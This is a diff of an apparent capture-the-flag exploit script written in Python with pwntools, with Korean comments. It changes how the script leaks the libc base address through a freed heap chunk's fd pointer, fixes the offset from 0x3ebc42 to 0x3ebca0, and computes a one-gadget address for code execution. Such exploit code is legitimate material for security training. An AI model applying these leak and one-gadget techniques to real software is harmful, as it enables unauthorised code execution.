@@ -39,14 +39,14 @@ def custom(size, data, idx):
 # [1] Leak libc base
 custom(0x500, b'random1', -1)  # 사이즈를 8바이트 단위로 `0x4f9 ~ 0x508` 까지는 같은 오프셋을 가리킴
 custom(0x500, b'random2', 0)
-custom(0x500, b'B', -1)
-# data 값이 'B'가 아니라 'C'가 된다면, 아스키코드 기준 1이 커진 값이 입력되므로, offset은 0x3ebc42 가 아니라 0x3ebc43가 되야한다.
-# 반대로 'A'라면, 0x3ebc41이어야 한다.
+custom(0x500, b'\xa0', -1)
+# data 값이 'A'라면, `fd`에서 하위 1바이트가 `0x41`로 바뀌기 때문에 오프셋 또한 0x3ebc41로 바뀌어 줘야 한다.
 
+# 이를 방지하고 항상 일정한 `fd`만 출력하게 하려면 `fd`를 전부 덮어준 후, `bk`를 출력하도록 하면 된다.
 # custom(0x500, b'a'*0x8, -1)
 # p.recvuntil(b'a'*0x8)
 
-libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc42
+libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebca0
 og = libc_base + 0x10a41c  # 제약 조건을 만족하는 원가젯
 # og = libc_base + 0x4f3ce
 # og = libc_base + 0x4f3d5
